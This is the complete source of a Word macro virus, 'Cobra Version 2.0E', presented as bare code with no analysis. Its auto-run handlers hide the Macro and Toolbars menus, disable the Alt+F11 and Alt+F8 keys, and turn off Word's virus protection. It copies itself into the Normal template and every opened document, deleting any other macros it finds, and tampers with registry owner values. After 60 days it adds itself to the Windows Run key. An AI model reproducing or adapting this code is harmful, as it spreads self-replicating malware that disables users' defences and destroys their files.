   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "BornCobra"
   'Cobra Version 2.0E
   'A intelligent member of Cobra family

   Sub AutoOpen()
   Call IntMenu
   Call InfCobra
   Call RegE
   End Sub
   Sub AutoClose()
   Call IntMenu
   Call InfCobra
   Call RegE
   End Sub
   Sub FileNew()
   Call IntMenu
   Call InfCobra
   Call RegE
   Dialogs(wdDialogFileNew).Show
   End Sub
   Sub FileOpen()
   Call IntMenu
   Call InfCobra
   Call RegE
   Dialogs(wdDialogFileOpen).Show
   End Sub
   Sub FileExit()
   On Error Resume Next
   Call IntMenu
   Call InfCobra
   Call RegE
   WordBasic.FileExit
   End Sub
   Sub IntMenu()
   On Error Resume Next
   CommandBars("Tools").Controls("Macro").Enabled = False
   CommandBars("Tools").Controls("Macro").Visible = False
   CommandBars("Tools").Controls("Macro").Delete
   CommandBars("View").Controls("Toolbars").Enabled = False
   CommandBars("View").Controls("Toolbars").Visible = False
   CommandBars("View").Controls("Toolbars").Delete
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   End Sub
   Sub InfCobra()
   On Error Resume Next
   Dim Mac, MacFound
   MacFound = False
   For Each Mac In NormalTemplate.VBProject.VBComponents
   If Mac.Name <> "ThisDocument" And Mac.Name <> "BornCobra" Then
   Application.OrganizerDelete Source:=NormalTemplate.FullName, _
   Name:=Mac.Name, Object:=wdOrganizerObjectProjectItems
   End If
   Next
   For Each Mac In NormalTemplate.VBProject.VBComponents
   If Mac.Name = "BornCobra" Then
   MacFound = True
   End If
   Next
   If MacFound = False Then
   Application.OrganizerCopy Source:=ActiveDocument.FullName, _
   Destination:=NormalTemplate.FullName, Name:="BornCobra", _
   Object:=wdOrganizerObjectProjectItems
   End If
   MacFound = False
   For Each Mac In ActiveDocument.VBProject.VBComponents
   If Mac.Name <> "ThisDocument" And Mac.Name <> "BornCobra" _
   And Mac.Name <> "Reference to Normal" Then
   Application.OrganizerDelete Source:=ActiveDocument.FullName, _
   Name:=Mac.Name, Object:=wdOrganizerObjectProjectItems
   End If
   Next
   For Each Mac In ActiveDocument.VBProject.VBComponents
   If Mac.Name = "BornCobra" Then
   MacFound = True
   End If
   Next
   If MacFound = False Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, _
   Destination:=ActiveDocument.FullName, Name:="BornCobra", _
   Object:=wdOrganizerObjectProjectItems
   End If
   End Sub
   Sub RegE()
   SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner")
   If SR <> "Cobra" Then
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,PB/ER/DHK-1217/BD"
   End If
   ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")
   If Not IsDate(ID) Then
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate") = Format(Date, "mm/dd/yyyy")
   ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")
   End If
   CD = Format(Date, "mm/dd/yyyy")
   TD = DateValue(CD) - DateValue(ID)
   If TD > 60 Then
   SysR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Cobra") = SysR + "\Cobra.Doc"
   ActiveDocument.SaveAs (SysR + "\Cobra.Doc"), FileFormat:=wdFormatTemplate
   WordBasic.FileExit
   End If
   End Sub
